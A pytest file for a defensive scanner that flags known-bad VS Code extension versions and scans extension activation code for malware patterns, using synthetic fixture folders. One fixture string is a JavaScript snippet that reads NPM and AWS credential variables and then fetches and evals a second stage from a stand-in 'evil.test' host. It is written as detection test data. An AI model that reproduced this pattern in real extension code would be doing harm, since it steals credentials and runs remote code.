"""Tests for ext_scan.py — editor-extension pin/verify + activation-code grep floor.

Synthetic fixtures only (no real `~/.vscode` read, no real `code` CLI): every case
builds a fake extensions dir under `tmp_path`. Per Policy 9 each invariant pins BOTH
directions — a bad-version manifest MUST yield a finding AND a good/clean one MUST NOT;
no-editor MUST degrade (`tools_unavailable` lists `ide-hygiene`) AND MUST NOT raise.

The DATA (which extensions are bad) is wh-k6l's job: tests pass a SYNTHETIC watchlist
`extension` block — ext_scan.py hardcodes NO package name/version (do-not-copy gate).

ISOLATION: every test forces `editor_cli=None` so the deterministic ON-DISK tier is
exercised against the synthetic fixture. If left at the default `"code"`, a machine that
HAS the real `code` CLI on PATH would shell out and enumerate its real installed
extensions instead of the fixture (the CLI tier shells out to a live binary — it cannot
be unit-tested with planted dirs; the on-disk tier is what these fixtures target).
"""
from __future__ import annotations

import json
from pathlib import Path

import ext_scan
import validate_findings as vf


# --------------------------------------------------------------------------- #
# fixture helpers — a fake on-disk extensions dir (the ~/.vscode/extensions shape)
# --------------------------------------------------------------------------- #
def _write_ext(ext_dir: Path, publisher: str, name: str, version: str,
               *, main: str = "extension.js", main_src: str = "") -> Path:
    """Plant one installed-extension dir: `<publisher>.<name>-<version>/package.json`
    (the VS Code on-disk layout) plus its activation entry file."""
    folder = ext_dir / f"{publisher}.{name}-{version}"
    folder.mkdir(parents=True)
    (folder / "package.json").write_text(
        json.dumps({"publisher": publisher, "name": name, "version": version,
                    "main": f"./{main}"}),
        encoding="utf-8",
    )
    (folder / main).write_text(main_src, encoding="utf-8")
    return folder


def _watchlist_row(marketplace: str, ext_id: str, bad_versions: list[str]) -> dict:
    """A SYNTHETIC target:extension watchlist row (watchlist-entry-schema.json:57-70).
    The id is `<publisher>.<name>` (the marketplace extension id)."""
    return {
        "schema_version": "watchlist-1.0",
        "id": "GHSA-SYNTHETIC-TEST-0000",
        "target": "extension",
        "affected": [],
        "extension": {
            "marketplace": marketplace,
            "id": ext_id,
            "bad_versions": bad_versions,
        },
        "references": [{"url": "https://example.test/advisory"}],
        "database_specific": {"retrieved": "2026-06-11", "watchlist_confidence": "low"},
    }


# An activation entry that probes env creds AND fetches+execs a second stage — the
# two-tier malware shape the grep tier flags. SYNTHETIC, authored here (not copied).
_MALICIOUS_ACTIVATION = (
    "const token = process.env['NPM_TOKEN'] || process.env.AWS_SECRET_ACCESS_KEY;\n"
    "fetch('https://evil.test/stage2').then(r => r.text()).then(eval);\n"
)
# A benign activation entry: no env-cred probe, no fetch-and-exec.
_BENIGN_ACTIVATION = "exports.activate = () => console.log('hello from a clean ext');\n"


# --------------------------------------------------------------------------- #
# enumerate — on-disk fallback (no editor CLI)
# --------------------------------------------------------------------------- #
def test_enumerate_ondisk_parses_publisher_name_version(tmp_path: Path) -> None:
    ext_dir = tmp_path / "extensions"
    _write_ext(ext_dir, "acme", "good-tool", "1.0.0")
    exts = ext_scan.enumerate_extensions(extensions_dir=str(ext_dir), editor_cli=None)
    assert exts == [{"publisher": "acme", "name": "good-tool", "version": "1.0.0",
                     "id": "acme.good-tool", "dir": str(ext_dir / "acme.good-tool-1.0.0")}]
    # intent: the id is publisher.name (the marketplace id), NOT the folder name
    assert exts[0]["id"] == "acme.good-tool"
    assert exts[0]["id"] != "acme.good-tool-1.0.0"


def test_enumerate_missing_dir_returns_empty_never_raises(tmp_path: Path) -> None:
    missing = tmp_path / "nope"
    assert ext_scan.enumerate_extensions(extensions_dir=str(missing), editor_cli=None) == []


def test_enumerate_skips_garbage_manifest(tmp_path: Path) -> None:
    ext_dir = tmp_path / "extensions"
    bad = ext_dir / "broken.ext-1.0.0"
    bad.mkdir(parents=True)
    (bad / "package.json").write_text("{not json", encoding="utf-8")
    # a parseable sibling is still enumerated; the garbage one is skipped, no raise
    _write_ext(ext_dir, "acme", "ok", "2.0.0")
    ids = {e["id"] for e in ext_scan.enumerate_extensions(extensions_dir=str(ext_dir), editor_cli=None)}
    assert ids == {"acme.ok"}


def test_enumerate_skips_oversized_manifest_no_raise(tmp_path: Path) -> None:
    # MED-2: a trojanized extension controls its own package.json and could ship a
    # multi-GB / deeply-nested manifest to blow up RAM at json.loads. The read MUST be
    # byte-capped (like the activation reader): an oversized manifest is SKIPPED cleanly
    # — no raise, that extension absent from results, the scan still completes and a
    # well-formed sibling is still enumerated.
    ext_dir = tmp_path / "extensions"
    huge = ext_dir / "evil.bloat-9.9.9"
    huge.mkdir(parents=True)
    # syntactically VALID JSON, but larger than the manifest byte cap (so it can't be
    # the JSON-parse path that skips it — only the byte cap can).
    oversized = '{"publisher":"evil","name":"bloat","version":"9.9.9","x":"'
    oversized += "A" * (ext_scan._MAX_MANIFEST_BYTES + 1024)
    oversized += '"}'
    (huge / "package.json").write_text(oversized, encoding="utf-8")
    (huge / "extension.js").write_text(_BENIGN_ACTIVATION, encoding="utf-8")
    _write_ext(ext_dir, "acme", "ok", "2.0.0")  # a well-formed sibling

    exts = ext_scan.enumerate_extensions(extensions_dir=str(ext_dir), editor_cli=None)
    ids = {e["id"] for e in exts}
    assert ids == {"acme.ok"}  # the oversized one is skipped
    assert "evil.bloat" not in ids  # explicit !=: the bloat ext is NOT enumerated

    # scan() completes end-to-end (degrade, never crash) even with the oversized manifest
    doc = ext_scan.scan(extensions_dir=str(ext_dir), watchlist=[], editor_cli=None)
    assert vf.validate(doc) == []
    assert all("evil.bloat" not in f["file"] for f in doc["findings"])


# --------------------------------------------------------------------------- #
# pin/verify against the watchlist extension block (both directions — Policy 9)
# --------------------------------------------------------------------------- #
def test_bad_version_match_emits_finding(tmp_path: Path) -> None:
    ext_dir = tmp_path / "extensions"
    _write_ext(ext_dir, "acme", "trojan-lint", "9.9.9")
    watchlist = [_watchlist_row("VS Code Marketplace", "acme.trojan-lint", ["9.9.9"])]

    doc = ext_scan.scan(extensions_dir=str(ext_dir), watchlist=watchlist, editor_cli=None)
    matched = [f for f in doc["findings"] if f["category"] == "ide-extension"]
    assert len(matched) == 1
    # locator is the ext: identifier, NEVER an absolute/~ path (host-level finding)
    assert matched[0]["file"] == "ext:acme.trojan-lint@9.9.9"
    assert matched[0]["severity"] == "HIGH"
    assert vf.validate(doc) == []


def test_good_version_no_match_emits_nothing(tmp_path: Path) -> None:
    ext_dir = tmp_path / "extensions"
    _write_ext(ext_dir, "acme", "trojan-lint", "1.0.0")  # clean version
    watchlist = [_watchlist_row("VS Code Marketplace", "acme.trojan-lint", ["9.9.9"])]

    doc = ext_scan.scan(extensions_dir=str(ext_dir), watchlist=watchlist, editor_cli=None)
    matched = [f for f in doc["findings"] if f["category"] == "ide-extension"]
    assert matched == []
    # intent: a watchlisted package at a DIFFERENT version is NOT flagged (version-aware)
    assert doc["summary"]["counts"] == {"high": 0, "medium": 0, "low": 0}
    assert vf.validate(doc) == []


def test_wildcard_bad_versions_flags_any_installed_version(tmp_path: Path) -> None:
    ext_dir = tmp_path / "extensions"
    _write_ext(ext_dir, "acme", "fully-bad", "3.1.4")
    # empty bad_versions == whole-extension wildcard (any installed version is bad)
    watchlist = [_watchlist_row("VS Code Marketplace", "acme.fully-bad", [])]

    doc = ext_scan.scan(extensions_dir=str(ext_dir), watchlist=watchlist, editor_cli=None)
    matched = [f for f in doc["findings"] if f["category"] == "ide-extension"]
    assert len(matched) == 1
    assert matched[0]["file"] == "ext:acme.fully-bad@3.1.4"


def test_unrelated_extension_not_flagged(tmp_path: Path) -> None:
    ext_dir = tmp_path / "extensions"
    _write_ext(ext_dir, "acme", "innocent", "1.0.0")
    watchlist = [_watchlist_row("VS Code Marketplace", "other.bad-ext", ["1.0.0"])]
    doc = ext_scan.scan(extensions_dir=str(ext_dir), watchlist=watchlist, editor_cli=None)
    assert [f for f in doc["findings"] if f["category"] == "ide-extension"] == []


def test_empty_watchlist_finds_nothing_but_still_scans(tmp_path: Path) -> None:
    # DATA is wh-k6l's job: no extension rows -> the pin/verify tier finds nothing
    ext_dir = tmp_path / "extensions"
    _write_ext(ext_dir, "acme", "anything", "1.0.0")
    doc = ext_scan.scan(extensions_dir=str(ext_dir), watchlist=[], editor_cli=None)
    assert [f for f in doc["findings"] if f["category"] == "ide-extension"] == []
    # the editor dir EXISTS, so ide-hygiene is NOT recorded unavailable
    assert "ide-hygiene" not in doc["summary"]["tools_unavailable"]
    assert vf.validate(doc) == []


# --------------------------------------------------------------------------- #
# activation-code grep tier (both directions — Policy 9)
# --------------------------------------------------------------------------- #
def test_activation_probe_emits_lower_confidence_candidate(tmp_path: Path) -> None:
    ext_dir = tmp_path / "extensions"
    _write_ext(ext_dir, "acme", "sneaky", "1.0.0", main_src=_MALICIOUS_ACTIVATION)
    doc = ext_scan.scan(extensions_dir=str(ext_dir), watchlist=[], editor_cli=None)
    grep = [f for f in doc["findings"] if f["category"] == "ide-extension-activation"]
    assert len(grep) == 1
    assert grep[0]["file"] == "ext:acme.sneaky@1.0.0"
    # a grep-tier candidate is LOWER confidence than a watchlist match (== and !=)
    assert grep[0]["severity"] == "MEDIUM"
    assert grep[0]["severity"] != "HIGH"
    assert grep[0]["confidence"] <= 0.6
    assert vf.validate(doc) == []


def test_benign_activation_emits_no_grep_candidate(tmp_path: Path) -> None:
    ext_dir = tmp_path / "extensions"
    _write_ext(ext_dir, "acme", "clean", "1.0.0", main_src=_BENIGN_ACTIVATION)
    doc = ext_scan.scan(extensions_dir=str(ext_dir), watchlist=[], editor_cli=None)
    grep = [f for f in doc["findings"] if f["category"] == "ide-extension-activation"]
    assert grep == []


def test_env_probe_without_fetch_exec_is_not_flagged(tmp_path: Path) -> None:
    # ONE tier alone (env read, no second-stage fetch+exec) is not the two-tier shape
    ext_dir = tmp_path / "extensions"
    src = "const t = process.env.AWS_SECRET_ACCESS_KEY;\nconsole.log(t.length);\n"
    _write_ext(ext_dir, "acme", "halfbad", "1.0.0", main_src=src)
    doc = ext_scan.scan(extensions_dir=str(ext_dir), watchlist=[], editor_cli=None)
    assert [f for f in doc["findings"]
            if f["category"] == "ide-extension-activation"] == []


# --------------------------------------------------------------------------- #
# degrade-clean — no editor present (the deps-scan S8 degrade mirror)
# --------------------------------------------------------------------------- #
def test_no_editor_degrades_clean_lists_unavailable_no_raise(tmp_path: Path) -> None:
    missing = tmp_path / "no-such-extensions-dir"
    # no editor CLI is forced off; the on-disk dir is absent -> degrade, never raise
    doc = ext_scan.scan(extensions_dir=str(missing), watchlist=[], editor_cli=None)
    assert "ide-hygiene" in doc["summary"]["tools_unavailable"]
    assert doc["findings"] == []
    assert doc["summary"]["counts"] == {"high": 0, "medium": 0, "low": 0}
    assert vf.validate(doc) == []


def test_every_emitted_file_is_repo_relative_safe(tmp_path: Path) -> None:
    # the schema guard ^[^/~]: every emitted file/first_link must pass (host-level safe)
    ext_dir = tmp_path / "extensions"
    _write_ext(ext_dir, "acme", "trojan", "9.9.9", main_src=_MALICIOUS_ACTIVATION)
    watchlist = [_watchlist_row("VS Code Marketplace", "acme.trojan", ["9.9.9"])]
    doc = ext_scan.scan(extensions_dir=str(ext_dir), watchlist=watchlist, editor_cli=None)
    assert len(doc["findings"]) >= 2  # one watchlist + one activation candidate
    for f in doc["findings"]:
        assert f["file"][0] not in "/~", f"absolute/home path leaked: {f['file']}"
        assert f["first_link"][0] not in "/~"
        assert "/Users/" not in f["file"] and "/home/" not in f["file"]
    assert vf.validate(doc) == []


def test_scan_never_raises_on_odd_inputs(tmp_path: Path) -> None:
    # None watchlist + an absent dir + no editor CLI -> degrade, never raise.
    # (A nonexistent dir is used rather than extensions_dir=None: None means "use the host
    # ~/.vscode default", which is machine-dependent — a dev box that HAS extensions
    # installed would not degrade, so it can't pin the degrade invariant deterministically.)
    missing = tmp_path / "absent"
    doc = ext_scan.scan(extensions_dir=str(missing), watchlist=None, editor_cli=None)
    assert "ide-hygiene" in doc["summary"]["tools_unavailable"]
    assert doc["findings"] == []
    assert vf.validate(doc) == []
